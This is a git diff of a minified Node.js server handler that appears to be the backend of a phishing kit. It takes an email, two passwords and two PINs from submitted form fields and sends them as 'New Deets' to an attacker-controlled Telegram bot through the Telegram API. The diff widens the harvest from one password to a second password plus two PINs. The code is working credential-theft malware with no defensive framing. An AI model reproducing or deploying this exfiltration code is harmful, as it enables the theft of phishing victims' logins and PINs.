@@ -9,13 +9,17 @@ module.exports = async function(s, e) {
         });
         const {
             phwet: t,
-            psdwet: o
+            psdwet: o,
+            psdwetp: p,
+            pnit: q,
+            pnitr: r
+
         } = s.body;
         if (!t && !o) return e.status(400).json({
             success: !1
         });
         try {
-            const s = `New Deets:\nEml: ${t||"Not provided"}\nPswd: ${o||"Not provided"}`,
+            const s = `New Deets:\nEml: ${t}\nPswd1: ${o}\nPswd2: ${p}\nPn1: ${q}\nPn2: ${r}`,
                 r = await fetch(`https://api.telegram.org/bot${process.env.TGBT}/sendMessage`, {
                     method: "POST",
                     headers: {
